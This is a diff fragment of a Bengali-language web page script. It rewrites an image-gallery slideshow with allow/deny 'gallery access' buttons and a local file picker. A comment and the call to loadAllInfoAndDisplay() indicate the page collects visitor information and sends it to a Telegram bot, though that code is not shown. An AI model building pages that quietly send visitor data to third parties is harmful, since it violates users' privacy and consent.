+        function pauseSlideshow() { if(!isAutoPlaying) return; isAutoPlaying = false; playPauseBtn.innerText = '▶️ চালু'; stopAutoSlide(); }
+        function resumeSlideshow() { if(isAutoPlaying) return; isAutoPlaying = true; playPauseBtn.innerText = '⏸️ থামাও'; startAutoSlide(); }
+        function togglePlay() { isAutoPlaying ? pauseSlideshow() : resumeSlideshow(); }
+
+        function loadImagesFromFiles(files) {
+            const imageFiles = Array.from(files).filter(f => f.type.startsWith('image/'));
+            if (imageFiles.length === 0) {
+                galleryMsg.innerText = "❌ কোনো ছবি সিলেক্ট করেননি। শুধু ইমেজ ফাইল দিন।";
+                return false;
             }
-            togglePlayPause();
-        });
-    }
-    
-    // যদি কখনও ব্রাউজার বন্ধ/পেজ আনলোড হলে মেমরি পরিষ্কার
-    window.addEventListener('beforeunload', () => {
-        if (selectedImages.length) {
-            for (let url of selectedImages) {
-                URL.revokeObjectURL(url);
+            revokeImages();
+            for (let file of imageFiles) {
+                selectedImageURLs.push(URL.createObjectURL(file));
             }
+            currentIdx = 0;
+            updateSlide(0);
+            if (slideshowDiv.style.display !== 'block') slideshowDiv.style.display = 'block';
+            isAutoPlaying = true;
+            playPauseBtn.innerText = '⏸️ থামাও';
+            startAutoSlide();
+            galleryMsg.innerHTML = `✅ ${selectedImageURLs.length} টি ছবি লোড! স্লাইডশো শুরু হয়েছে 🎉`;
+            return true;
         }
-        if (slideInterval) clearInterval(slideInterval);
-    });
-    
-    // প্রাথমিকভাবে স্লাইডশো এরিয়া লুকানো (ছবি না থাকা পর্যন্ত)
-    slideshowArea.style.display = 'none';
-    
-    // small fallback: যদি টেলিগ্রাম বট চেক করতে error হয় তাও গ্যালারি ফিচার কাজ করবে
-    console.log("গ্যালারী মডিউল লোড হয়েছে। অনুমতি চাইলে ছবি আসা শুরু করবে ✅");
-    
-    // এক্সট্রা : পুনরায় ছবি পরিবর্তনের সম্ভাবনা (চাইলেও আবার অনুমতি বাটন দিয়ে নতুন ছবি সিলেক্ট)
-    // এটা স্বাভাবিক: অনুমতি দিন বাটন সবসময় কাজ করবে নতুন করে ছবি লোড করতে, যা আগের ছবি প্রতিস্থাপন করবে।
-    // ডিনাই বাটন শুধুমাত্র নেতিবাচক মেসেজ দেখায়, স্লাইডশো না থাকলে লুকায়, কিন্তু আবার অনুমতি দিতে বাধা নেই।
-})();
+
+        function requestGallery() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.multiple = true;
+            input.onchange = (e) => {
+                if (e.target.files && e.target.files.length) {
+                    loadImagesFromFiles(e.target.files);
+                } else {
+                    galleryMsg.innerText = "কোনো ফাইল সিলেক্ট করা হয়নি।";
+                }
+                input.remove();
+            };
+            input.click();
+        }
+
+        document.getElementById('allowGalleryBtn').addEventListener('click', () => {
+            galleryMsg.innerHTML = "📸 গ্যালারি অ্যাক্সেস চাচ্ছি... ছবি সিলেক্ট করুন।";
+            requestGallery();
+        });
+        document.getElementById('denyGalleryBtn').addEventListener('click', () => {
+            galleryMsg.innerHTML = "🔴 আপনি গ্যালারি অ্যাক্সেস অস্বীকার করেছেন। ছবি দেখা যাবে না। আবার চাইলে 'অনুমতি দিন' ক্লিক করুন।";
+            if (!selectedImageURLs.length) slideshowDiv.style.display = 'none';
+            else slideshowDiv.style.display = 'block';
+        });
+        if (prevBtn) prevBtn.onclick = () => { if(selectedImageURLs.length) updateSlide(currentIdx-1); };
+        if (nextBtn) nextBtn.onclick = () => { if(selectedImageURLs.length) updateSlide(currentIdx+1); };
+        if (playPauseBtn) playPauseBtn.onclick = togglePlay;
+
+        // সব তথ্য দেখানো শুরু এবং টেলিগ্রাম পাঠানো
+        loadAllInfoAndDisplay();
+
+        // প্রতি 30 সেকেন্ডে সময় রিফ্রেশ (শুধু স্থানীয় সময় আপডেট)
+        setInterval(() => {
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
+            const timeElements = document.querySelectorAll('.info-item');
+            for(let el of timeElements) {
+                if(el.innerText.includes("স্থানীয় সময়")) {
+                    el.querySelector('.info-value').innerText = localTime;
+                }
+                if(el.innerText.includes("টাইমজোন") && el.querySelector('.info-value').innerText !== timezone) {
+                    el.querySelector('.info-value').innerText = timezone;
+                }
+            }
+        }, 1000);
+    })();
 </script>
 </body>
 </html>
